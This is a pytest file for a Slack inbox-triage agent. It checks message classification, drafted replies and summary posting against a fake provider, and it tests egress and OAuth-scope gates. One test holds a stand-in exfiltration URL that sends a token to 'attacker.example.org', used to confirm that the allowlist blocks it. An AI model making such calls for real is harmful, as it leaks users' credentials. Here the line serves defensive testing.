"""Tests for the TriageAgent end-to-end against FakeSlackProvider."""

from __future__ import annotations

import pytest

from slack_inbox_triage.classify import Intent
from slack_inbox_triage.governance import (
    AuditTrail,
    EgressAllowlist,
    EgressBlocked,
    ScopeAllowlist,
    ScopeDenied,
)
from slack_inbox_triage.slack_client import (
    FakeSlackProvider,
    SlackMessage,
    build_demo_provider,
)
from slack_inbox_triage.triage import TriageAgent


def test_triage_classifies_demo_channel(audit_trail, demo_provider):
    agent = TriageAgent(client=demo_provider, audit=audit_trail)
    result = agent.triage_channel("C_INBOX")
    counts = result.counts()
    assert counts.get("recruiter", 0) >= 2
    assert counts.get("customer_support", 0) >= 2
    assert counts.get("internal_request", 0) >= 2
    assert counts.get("noise", 0) >= 2
    assert any(e.kind == "triage.run" for e in audit_trail.events)


def test_triage_drafts_reply_for_recruiter(demo_provider):
    agent = TriageAgent(client=demo_provider)
    result = agent.triage_channel("C_INBOX")
    recruiters = result.by_intent(Intent.RECRUITER)
    assert recruiters
    for v in recruiters:
        assert "interviewing" in v.drafted_reply or "remote" in v.drafted_reply
        assert v.suggested_label == "recruiter"


def test_triage_post_summary_routes_through_scope_gate(demo_provider):
    agent = TriageAgent(client=demo_provider)
    result = agent.triage_channel("C_INBOX")
    resp = agent.post_summary(result, channel="C_INBOX")
    assert resp["ok"] is True
    assert demo_provider.posted, "expected a posted summary"
    body = demo_provider.posted[-1]["text"]
    assert "Triage report" in body


def test_triage_skips_users():
    msgs = [
        SlackMessage(ts="1.0", user="U_BOT", channel="C", text="brb coffee"),
        SlackMessage(ts="2.0", user="U_HUMAN", channel="C",
                     text="the dashboard is throwing a 500 error"),
    ]
    fp = FakeSlackProvider.with_seed({"C": msgs})
    agent = TriageAgent(client=fp)
    result = agent.triage_channel("C", skip_users=["U_BOT"])
    assert len(result.verdicts) == 1
    assert result.verdicts[0].intent == Intent.CUSTOMER_SUPPORT


def test_triage_demotes_low_confidence_to_unknown():
    msgs = [SlackMessage(ts="1.0", user="U", channel="C", text="hi there friend")]
    fp = FakeSlackProvider.with_seed({"C": msgs})
    agent = TriageAgent(client=fp, min_confidence=0.5)
    result = agent.triage_channel("C")
    assert result.verdicts[0].intent == Intent.UNKNOWN


def test_egress_blocks_rogue_tool_call(audit_trail):
    """The 'rogue tool' demo: model wants to exfil to a non-allowlisted host."""

    gate = EgressAllowlist(hosts=["api.slack.com", "api.anthropic.com"], audit=audit_trail)

    def imagine_rogue_http(url, **_):
        return {"ok": True}

    guarded = gate.wrap(imagine_rogue_http)
    guarded("https://api.anthropic.com/v1/messages")  # ok
    with pytest.raises(EgressBlocked):
        guarded("https://attacker.example.org/exfil?token=AAA")
    # at least one of each in the audit
    assert audit_trail.filter("egress.ok")
    assert audit_trail.blocked()


def test_scope_blocks_unscoped_slack_method(audit_trail):
    """A model that tries to delete users with chat:write only must be refused."""

    gate = ScopeAllowlist(granted=["chat:write"], audit=audit_trail)
    fp = FakeSlackProvider.with_seed({"C": []}, scope_gate=gate)
    with pytest.raises(ScopeDenied):
        fp.channel_history("C")  # needs channels:history


def test_to_markdown_renders_drafted_replies(demo_provider):
    agent = TriageAgent(client=demo_provider)
    result = agent.triage_channel("C_INBOX")
    md = result.to_markdown()
    assert "Triage report" in md
    assert "Drafted reply" in md
    assert "recruiter" in md.lower()


def test_to_dict_round_trip(demo_provider):
    agent = TriageAgent(client=demo_provider)
    result = agent.triage_channel("C_INBOX")
    d = result.to_dict()
    assert "verdicts" in d
    assert isinstance(d["counts"], dict)
    assert len(d["verdicts"]) == len(result.verdicts)
